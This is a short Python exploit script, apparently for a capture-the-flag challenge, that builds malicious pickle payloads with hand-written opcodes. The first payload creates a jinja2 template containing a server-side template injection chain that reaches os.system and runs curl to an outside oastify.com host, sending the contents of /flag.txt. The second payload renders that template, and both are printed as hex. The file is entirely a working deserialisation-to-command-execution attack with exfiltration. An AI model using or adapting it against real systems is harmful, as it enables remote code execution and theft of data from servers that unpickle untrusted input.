from pwn import pickle
import pickletools


data = b""
data += pickle.PROTO + bytes([2])
data += pickle.PROTO + bytes([2])
data += pickle.PROTO + bytes([1])

# Step 1: 
step_1 = data 
step_1 += pickle.MARK 
step_1 += pickle.STRING + b"'{{{}.__class__.__mro__[-1].__subclasses__()[137].__init__.__globals__['__builtins__']['__import__']('os').system('curl http://w308r52sco6xvfboieb512vkgbm2asyh.oastify.com/`cat /flag.txt`')}}'\n"
step_1 += pickle.INST + b"__main__\njinja2.Template\n"
step_1 += pickle.STOP
# step 2:
step_2 = data
step_2 += pickle.MARK
step_2 += pickle.INST + b"__main__\nresult.render\n"
step_2 += pickle.STOP

# pickletools.dis(data)
print(step_1.hex())
print(step_2.hex())

